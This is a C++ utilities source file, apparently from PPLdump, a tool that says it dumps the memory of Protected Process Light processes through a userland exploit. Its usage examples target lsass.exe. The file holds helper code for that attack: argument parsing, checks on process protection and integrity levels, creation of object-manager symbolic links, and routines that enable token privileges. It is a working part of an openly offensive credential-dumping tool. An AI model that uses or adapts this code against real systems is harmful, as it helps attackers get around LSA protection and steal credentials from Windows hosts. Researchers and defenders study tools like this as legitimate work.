#include "utils.h"

BOOL ParseArguments(int argc, wchar_t* argv[])
{
	BOOL bReturnValue = TRUE;
	BOOL bHelp = FALSE;

	if (argc < 3)
	{
		PrintUsage();
		return FALSE;
	}

	// Read dump file path
	--argc;
	g_pwszDumpFilePath = argv[argc];

	// Read target process name or pid
	--argc;
	g_pwszProcessName = argv[argc];

	// Try to interpret target process argument as a number (PID rather than name)
	g_dwProcessId = wcstoul(argv[argc], nullptr, 10);

	if (g_dwProcessId != 0)
		g_pwszProcessName = NULL;

	// Parse options
	while ((argc > 1) && (argv[1][0] == '-'))
	{
		switch (argv[1][1])
		{
		case 'h':
			bReturnValue = FALSE;
			bHelp = TRUE;
			break;
		case 'v':
			g_bVerbose = TRUE;
			break;
		case 'd':
			g_bVerbose = TRUE;
			g_bDebug = TRUE;
			break;
		case 'f':
			g_bForce = TRUE;
			break;
		default:
			wprintf(L"[-] Invalid option: %ws\n", argv[1]);
			bReturnValue = FALSE;
		}
		++argv;
		--argc;
	}

	if (bHelp)
	{
		PrintUsage();
		return FALSE;
	}

	return bReturnValue;
}

VOID PrintArguments()
{
	PrintVerbose(L"Verbose=%d | Debug=%d | Force=%d | Proc='%ws' | PID=%d | File='%ws'", g_bVerbose, g_bDebug, g_bForce, g_pwszProcessName, g_dwProcessId, g_pwszDumpFilePath);
}

VOID PrintUsage()
{
	wprintf(
		L" _____ _____ __      _               \n"
		"|  _  |  _  |  |   _| |_ _ _____ ___ \n"
		"|   __|   __|  |__| . | | |     | . |  version %ws\n"
		"|__|  |__|  |_____|___|___|_|_|_|  _|  by %ws\n"
		"                                |_|  \n"
		"\n"
		"Description:\n"
		"  Dump the memory of a Protected Process Light (PPL) with a *userland* exploit\n"
		"\n",
		VERSION,
		AUTHOR
	);

	wprintf(
		L"Usage: \n"
		"  PPLdump.exe [-v] [-d] [-f] <PROC_NAME|PROC_ID> <DUMP_FILE>\n"
		"\n"
	);

	wprintf(
		L"Arguments:\n"
		"  PROC_NAME  The name of a Process to dump\n"
		"  PROC_ID    The ID of a Process to dump\n"
		"  DUMP_FILE  The path of the output dump file\n"
		"\n"
	);

	wprintf(
		L"Options:\n"
		"  -v         (Verbose) Enable verbose mode\n"
		"  -d         (Debug) Enable debug mode (implies verbose)\n"
		"  -f         (Force) Bypass DefineDosDevice error check\n"
		"\n"
	);

	wprintf(
		L"Examples:\n"
		"  PPLdump.exe lsass.exe lsass.dmp\n"
		"  PPLdump.exe -v 720 out.dmp\n"
	);
}

VOID PrintLastError(LPCWSTR pwszFunctionName)
{
	DWORD dwLastError = GetLastError();
	wprintf(L"[-] %ws failed with error code %d - %ws\n", pwszFunctionName, dwLastError, _com_error(HRESULT_FROM_WIN32(dwLastError)).ErrorMessage());
}

VOID PrintVerbose(LPCWSTR pwszFormat, ...)
{
	if (g_bVerbose)
	{
		LPWSTR pwszVerboseString = NULL;
		DWORD dwVerboseStringLen = 0;
		va_list va;
		size_t st_Offset = 0;
		WCHAR wszUsername[UNLEN + 1] = { 0 };
		DWORD dwUsernameLen = UNLEN;

		GetUserName(wszUsername, &dwUsernameLen);

		va_start(va, pwszFormat);
		if (g_bDebug)
			dwVerboseStringLen += _scwprintf(L"[%ws] ", wszUsername) * sizeof(WCHAR);
		
		dwVerboseStringLen += _vscwprintf(pwszFormat, va) * sizeof(WCHAR) + 2;
		pwszVerboseString = (LPWSTR)LocalAlloc(LPTR, dwVerboseStringLen);

		if (pwszVerboseString)
		{
			if (g_bDebug)
				StringCbPrintf(pwszVerboseString, dwVerboseStringLen, L"[%ws] ", wszUsername);

			if (SUCCEEDED(StringCbLength(pwszVerboseString, dwVerboseStringLen, &st_Offset)))
			{
				StringCbVPrintf(&pwszVerboseString[st_Offset / sizeof(WCHAR)], dwVerboseStringLen - st_Offset, pwszFormat, va);

				wprintf(L"%ws", pwszVerboseString);
			}

			LocalFree(pwszVerboseString);
		}

		va_end(va);
	}
}

VOID PrintDebug(LPCWSTR pwszFormat, ...)
{
	if (g_bDebug)
	{
		LPWSTR pwszDebugString = NULL;
		DWORD dwDebugStringLen = 0;
		va_list va;
		size_t st_Offset = 0;
		WCHAR wszUsername[UNLEN + 1] = { 0 };
		DWORD dwUsernameLen = UNLEN;

		GetUserName(wszUsername, &dwUsernameLen);

		va_start(va, pwszFormat);
		dwDebugStringLen += _scwprintf(L"[DEBUG][%ws] ", wszUsername) * sizeof(WCHAR);
		dwDebugStringLen += _vscwprintf(pwszFormat, va) * sizeof(WCHAR) + 2;
		pwszDebugString = (LPWSTR)LocalAlloc(LPTR, dwDebugStringLen);

		if (pwszDebugString)
		{
			StringCbPrintf(pwszDebugString, dwDebugStringLen, L"[DEBUG][%ws] ", wszUsername);

			if (SUCCEEDED(StringCbLength(pwszDebugString, dwDebugStringLen, &st_Offset)))
			{
				StringCbVPrintf(&pwszDebugString[st_Offset / sizeof(WCHAR)], dwDebugStringLen - st_Offset, pwszFormat, va);

				wprintf(L"%ws", pwszDebugString);
			}

			LocalFree(pwszDebugString);
		}

		va_end(va);
	}
}

BOOL ProcessGetProtectionLevel(DWORD dwProcessId, PDWORD pdwProtectionLevel)
{
	BOOL bReturnValue = FALSE;

	HANDLE hProcess = NULL;
	PROCESS_PROTECTION_LEVEL_INFORMATION level = { 0 };

	if (!(hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, dwProcessId)))
	{
		PrintLastError(L"OpenProcess");
		goto end;
	}

	if (!GetProcessInformation(hProcess, ProcessProtectionLevelInfo, &level, sizeof(level)))
	{
		PrintLastError(L"GetProcessInformation");
		goto end;
	}

	*pdwProtectionLevel = level.ProtectionLevel;
	bReturnValue = TRUE;

end:
	if (hProcess)
		CloseHandle(hProcess);

	return bReturnValue;
}

BOOL ProcessGetProtectionLevelAsString(DWORD dwProcessId, LPWSTR* ppwszProtectionLevel)
{
	BOOL bReturnValue = TRUE;

	DWORD dwProtectionLevel = 0;
	LPCWSTR pwszProtectionName = NULL;

	if (!ProcessGetProtectionLevel(dwProcessId, &dwProtectionLevel))
		return FALSE;

	*ppwszProtectionLevel = (LPWSTR)LocalAlloc(LPTR, 64 * sizeof(WCHAR));
	if (!*ppwszProtectionLevel)
		return FALSE;

	switch (dwProtectionLevel)
	{
	case PROTECTION_LEVEL_WINTCB_LIGHT:
		pwszProtectionName = L"PsProtectedSignerWinTcb-Light";
		break;
	case PROTECTION_LEVEL_WINDOWS:
		pwszProtectionName = L"PsProtectedSignerWindows";
		break;
	case PROTECTION_LEVEL_WINDOWS_LIGHT:
		pwszProtectionName = L"PsProtectedSignerWindows-Light";
		break;
	case PROTECTION_LEVEL_ANTIMALWARE_LIGHT:
		pwszProtectionName = L"PsProtectedSignerAntimalware-Light";
		break;
	case PROTECTION_LEVEL_LSA_LIGHT:
		pwszProtectionName = L"PsProtectedSignerLsa-Light";
		break;
	case PROTECTION_LEVEL_WINTCB:
		pwszProtectionName = L"PsProtectedSignerWinTcb";
		break;
	case PROTECTION_LEVEL_CODEGEN_LIGHT:
		pwszProtectionName = L"PsProtectedSignerCodegen-Light";
		break;
	case PROTECTION_LEVEL_AUTHENTICODE:
		pwszProtectionName = L"PsProtectedSignerAuthenticode";
		break;
	case PROTECTION_LEVEL_PPL_APP:
		pwszProtectionName = L"PsProtectedSignerPplApp";
		break;
	case PROTECTION_LEVEL_NONE:
		pwszProtectionName = L"None";
		break;
	default:
		pwszProtectionName = L"Unknown";
		bReturnValue = FALSE;
	}

	StringCchPrintf(*ppwszProtectionLevel, 64, L"%ws", pwszProtectionName);
	
	return bReturnValue;
}

BOOL ProcessGetIntegrityLevel(DWORD dwProcessId, PDWORD pdwIntegrityLevel)
{
	BOOL bReturnValue = FALSE;

	HANDLE hProcess = NULL;
	HANDLE hProcessToken = NULL;
	PTOKEN_MANDATORY_LABEL pLabel = NULL;
	DWORD dwLength = 0;
	DWORD dwIntegrityLevel = 0;

	if (!(hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwProcessId)))
		goto end;

	if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hProcessToken))
		goto end;

	GetTokenInformation(hProcessToken, TokenIntegrityLevel, pLabel, dwLength, &dwLength);
	if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
		goto end;

	pLabel = (PTOKEN_MANDATORY_LABEL)LocalAlloc(LPTR, dwLength);
	if (!pLabel)
		goto end;

	if (!GetTokenInformation(hProcessToken, TokenIntegrityLevel, pLabel, dwLength, &dwLength))
		goto end;

	dwIntegrityLevel = *GetSidSubAuthority(pLabel->Label.Sid, *GetSidSubAuthorityCount(pLabel->Label.Sid) - 1);
	*pdwIntegrityLevel = dwIntegrityLevel;
	bReturnValue = TRUE;

end:
	if (pLabel)
		LocalFree(pLabel);
	if (hProcessToken)
		CloseHandle(hProcessToken);
	if (hProcess)
		CloseHandle(hProcess);

	return bReturnValue;
}

BOOL ProcessGetPIDFromName(LPWSTR pwszProcessName, PDWORD pdwProcessId)
{
	BOOL bReturnValue = FALSE;

	HANDLE hProcessSnap = NULL;
	PROCESSENTRY32 pe32 = { 0 };
	DWORD dwProcessId = 0;
	DWORD dwMatchCount = 0;
	BOOL bMatch = FALSE;

	if ((hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)) == INVALID_HANDLE_VALUE)
	{
		PrintLastError(L"CreateToolhelp32Snapshot");
		goto end;
	}

	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (!Process32First(hProcessSnap, &pe32))
	{
		PrintLastError(L"Process32First");
		goto end;
	}

	do
	{
		bMatch = FALSE;

		if (_wcsicmp(pe32.szExeFile, pwszProcessName) == 0)
			bMatch = TRUE;
		else
		{
			if (PathCchRemoveExtension(pe32.szExeFile, wcslen(pe32.szExeFile) + 1) == S_OK)
			{
				if (_wcsicmp(pe32.szExeFile, pwszProcessName) == 0)
					bMatch = TRUE;
			}
		}

		if (bMatch)
		{
			dwProcessId = pe32.th32ProcessID;
			dwMatchCount++;
		}

	} while (Process32Next(hProcessSnap, &pe32));

	if (dwMatchCount == 0)
	{
		wprintf(L"[-] Failed to find a process that matches the provided name.\n");
		goto end;
	}

	if (dwMatchCount > 1)
	{
		wprintf(L"[-] Found more than one process that matches the provided name. Please provide a PID instead.\n");
		goto end;
	}

	*pdwProcessId = dwProcessId;
	bReturnValue = TRUE;

end:
	if (hProcessSnap)
		CloseHandle(hProcessSnap);

	return bReturnValue;
}

HANDLE ObjectManagerCreateDirectory(LPCWSTR dirname)
{
	OBJECT_ATTRIBUTES oa = { 0 };
	UNICODE_STRING name = { 0 };
	HANDLE hDirectory = NULL;
	NTSTATUS status = 0;

	RtlInitUnicodeString(&name, dirname);
	InitializeObjectAttributes(&oa, &name, OBJ_CASE_INSENSITIVE, NULL, NULL);

	status = NtCreateDirectoryObjectEx(&hDirectory, DIRECTORY_ALL_ACCESS, &oa, NULL, FALSE);
	SetLastError(RtlNtStatusToDosError(status));
	if (status != 0)
	{
		PrintLastError(L"NtCreateDirectoryObjectEx");
		return NULL;
	}

	return hDirectory;
}

HANDLE ObjectManagerCreateSymlink(LPCWSTR linkname, LPCWSTR targetname)
{
	OBJECT_ATTRIBUTES oa = { 0 };
	UNICODE_STRING name = { 0 };
	UNICODE_STRING target = { 0 };
	HANDLE hLink = NULL;
	NTSTATUS status = 0;

	RtlInitUnicodeString(&name, linkname);
	RtlInitUnicodeString(&target, targetname);
	InitializeObjectAttributes(&oa, &name, OBJ_CASE_INSENSITIVE, NULL, NULL);

	status = NtCreateSymbolicLinkObject(&hLink, SYMBOLIC_LINK_ALL_ACCESS, &oa, &target);
	SetLastError(RtlNtStatusToDosError(status));
	if (status != 0)
	{
		PrintLastError(L"NtCreateSymbolicLinkObject");
		return NULL;
	}

	return hLink;
}

BOOL TokenGetSid(HANDLE hToken, PSID* ppSid)
{
	BOOL bReturnValue = TRUE;
	DWORD dwSize = 0;
	PTOKEN_USER pTokenUser = NULL;

	if (!GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize))
	{
		if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
			PrintLastError(L"GetTokenInformation");
			goto end;
		}
	}

	pTokenUser = (PTOKEN_USER)LocalAlloc(LPTR, dwSize);
	if (!pTokenUser)
		goto end;

	if (!GetTokenInformation(hToken, TokenUser, pTokenUser, dwSize, &dwSize))
	{
		PrintLastError(L"GetTokenInformation");
		goto end;
	}

	*ppSid = (PSID)LocalAlloc(LPTR, SECURITY_MAX_SID_SIZE);
	if (!*ppSid)
		goto end;

	if (!CopySid(SECURITY_MAX_SID_SIZE, *ppSid, pTokenUser->User.Sid))
	{
		PrintLastError(L"CopySid");
		LocalFree(*ppSid);
		goto end;
	}

	bReturnValue = TRUE;

end:
	if (pTokenUser)
		LocalFree(pTokenUser);

	return bReturnValue;
}

BOOL TokenGetSidAsString(HANDLE hToken, LPWSTR* ppwszStringSid)
{
	BOOL bReturnValue = FALSE;
	PSID pSid = NULL;

	if (TokenGetSid(hToken, &pSid))
	{
		if (ConvertSidToStringSid(pSid, ppwszStringSid))
		{
			bReturnValue = TRUE;
		}
		LocalFree(pSid);
	}

	return bReturnValue;
}

BOOL TokenCompareSids(PSID pSidA, PSID pSidB)
{
	BOOL bReturnValue = FALSE;
	LPWSTR pwszSidA = NULL;
	LPWSTR pwszSidB = NULL;

	if (ConvertSidToStringSid(pSidA, &pwszSidA) && ConvertSidToStringSid(pSidB, &pwszSidB))
	{
		bReturnValue = _wcsicmp(pwszSidA, pwszSidB) == 0;
		LocalFree(pwszSidA);
		LocalFree(pwszSidB);
	}
	else
		PrintLastError(L"ConvertSidToStringSid");

	return bReturnValue;
}

BOOL TokenGetUsername(HANDLE hToken, LPWSTR* ppwszUsername)
{
	BOOL bReturnValue = FALSE;
	PSID pSid = NULL;
	const DWORD dwMaxSize = 256;
	WCHAR wszUsername[dwMaxSize] = { 0 };
	WCHAR wszDomain[dwMaxSize] = { 0 };
	DWORD dwMaxUsername = dwMaxSize;
	DWORD dwMaxDomain = dwMaxSize;
	SID_NAME_USE type;

	if (!TokenGetSid(hToken, &pSid))
		goto end;

	if (!LookupAccountSid(NULL, pSid, wszUsername, &dwMaxUsername, wszDomain, &dwMaxDomain, &type))
	{
		PrintLastError(L"LookupAccountSid");
		goto end;
	}

	*ppwszUsername = (LPWSTR)LocalAlloc(LPTR, (dwMaxSize * 2 + 1) * sizeof(WCHAR));
	if (!*ppwszUsername)
		goto end;

	StringCchPrintf(*ppwszUsername, dwMaxSize * 2 + 1, L"%ws\\%ws", wszDomain, wszUsername);
	bReturnValue = TRUE;

end:
	if (pSid)
		LocalFree(pSid);

	return bReturnValue;
}

BOOL TokenCheckPrivilege(HANDLE hToken, LPCWSTR pwszPrivilege, BOOL bEnablePrivilege)
{
	BOOL bReturnValue = FALSE;
	DWORD dwTokenPrivilegesSize = 0, i = 0, dwPrivilegeNameLength = 0;
	PTOKEN_PRIVILEGES pTokenPrivileges = NULL;
	LUID_AND_ATTRIBUTES laa = { 0 };
	TOKEN_PRIVILEGES tp = { 0 };
	LPWSTR pwszPrivilegeNameTemp = NULL;

	if (!GetTokenInformation(hToken, TokenPrivileges, NULL, dwTokenPrivilegesSize, &dwTokenPrivilegesSize))
	{
		if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
		{
			PrintLastError(L"GetTokenInformation");
			goto end;
		}
	}

	pTokenPrivileges = (PTOKEN_PRIVILEGES)LocalAlloc(LPTR, dwTokenPrivilegesSize);
	if (!pTokenPrivileges)
		goto end;

	if (!GetTokenInformation(hToken, TokenPrivileges, pTokenPrivileges, dwTokenPrivilegesSize, &dwTokenPrivilegesSize))
	{
		PrintLastError(L"GetTokenInformation");
		goto end;
	}

	for (i = 0; i < pTokenPrivileges->PrivilegeCount; i++)
	{
		laa = pTokenPrivileges->Privileges[i];
		dwPrivilegeNameLength = 0;

		if (!LookupPrivilegeName(NULL, &(laa.Luid), NULL, &dwPrivilegeNameLength))
		{
			if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
			{
				PrintLastError(L"LookupPrivilegeName");
				goto end;
			}
		}

		dwPrivilegeNameLength++;

		if (pwszPrivilegeNameTemp = (LPWSTR)LocalAlloc(LPTR, dwPrivilegeNameLength * sizeof(WCHAR)))
		{
			if (LookupPrivilegeName(NULL, &(laa.Luid), pwszPrivilegeNameTemp, &dwPrivilegeNameLength))
			{
				if (!_wcsicmp(pwszPrivilegeNameTemp, pwszPrivilege))
				{
					if (bEnablePrivilege)
					{
						ZeroMemory(&tp, sizeof(TOKEN_PRIVILEGES));
						tp.PrivilegeCount = 1;
						tp.Privileges[0].Luid = laa.Luid;
						tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

						if (AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), (PTOKEN_PRIVILEGES)NULL, (PDWORD)NULL))
							bReturnValue = TRUE;
						else
							PrintLastError(L"AdjustTokenPrivileges");
					}
					else
					{
						bReturnValue = TRUE;
					}

					break;
				}
			}
			else
				PrintLastError(L"LookupPrivilegeName");

			LocalFree(pwszPrivilegeNameTemp);
		}
	}

end:
	if (pTokenPrivileges)
		LocalFree(pTokenPrivileges);

	return bReturnValue;
}

BOOL TokenIsNotRestricted(HANDLE hToken, PBOOL pbIsNotRestricted)
{
	BOOL bReturnValue = FALSE;

	DWORD dwSize = 0;
	PTOKEN_GROUPS pTokenGroups = NULL;

	if (!GetTokenInformation(hToken, TokenRestrictedSids, NULL, dwSize, &dwSize))
	{
		if (GetLastError() != ERROR_INSUFFICIENT_BUFFER)
		{
			PrintLastError(L"GetTokenInformation");
			goto end;
		}
	}

	pTokenGroups = (PTOKEN_GROUPS)LocalAlloc(LPTR, dwSize);
	if (!pTokenGroups)
		goto end;

	if (!GetTokenInformation(hToken, TokenRestrictedSids, pTokenGroups, dwSize, &dwSize))
	{
		PrintLastError(L"GetTokenInformation");
		goto end;
	}

	*pbIsNotRestricted = pTokenGroups->GroupCount == 0;

	bReturnValue = TRUE;

end:
	if (pTokenGroups)
		LocalFree(pTokenGroups);

	return bReturnValue;
}

BOOL MiscSystemArchIsAmd64()
{
	SYSTEM_INFO sysinfo = { 0 };
	GetNativeSystemInfo(&sysinfo);
	return sysinfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64;
}

BOOL MiscGenerateGuidString(LPWSTR* ppwszGuid)
{
	BOOL bReturnValue = FALSE;

	UUID uuid = { 0 };
	RPC_WSTR wstrGuid = NULL;

	if (UuidCreate(&uuid) != RPC_S_OK)
		goto end;

	if (UuidToString(&uuid, &wstrGuid) != RPC_S_OK)
		goto end;

	*ppwszGuid = (LPWSTR)LocalAlloc(LPTR, (wcslen((LPWSTR)wstrGuid) + 1) * sizeof(WCHAR));
	if (!*ppwszGuid)
		goto end;

	StringCchPrintf(*ppwszGuid, wcslen((LPWSTR)wstrGuid), L"%ws", (LPWSTR)wstrGuid);
	bReturnValue = TRUE;

end:
	if (wstrGuid)
		RpcStringFree(&wstrGuid);

	return bReturnValue;
}
